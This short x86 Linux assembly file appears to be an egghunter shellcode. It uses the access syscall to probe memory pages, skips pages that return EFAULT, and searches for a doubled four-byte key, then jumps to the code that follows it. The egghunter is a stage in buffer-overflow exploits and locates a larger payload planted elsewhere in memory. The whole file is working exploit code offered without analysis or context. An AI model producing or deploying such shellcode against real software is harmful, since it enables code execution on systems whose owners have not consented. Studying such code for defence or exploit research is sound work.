global _start

section .text
_start:
    xor ecx, ecx        ; Register initialization
    mul ecx

next_page:
    or dx, 0xfff        ; Align to next page

next_addr:
    inc edx             ; Increment addr in current page
    
    lea ebx, [edx+0x4]  ; ACCESS arg1: addr to check
    push byte 0x21      ; Load ACCESS syscall...
    pop eax             ; ...into EAX
    int 0x80            ; Exec interrupt

    cmp al, 0xf2        ; EFAULT returned?
    jz next_page        ; If so, skip to next page

    mov eax,0x91929291  ; Key
    mov edi,edx         ; Populate EDX for scasd
    scasd               ; Compare to key
    jnz next_addr       ; Jump if not matched
    scasd               ; Compare 2nd time
    jnz next_addr       ; Jump if not matched
    jmp edi             ; Jump to address after key
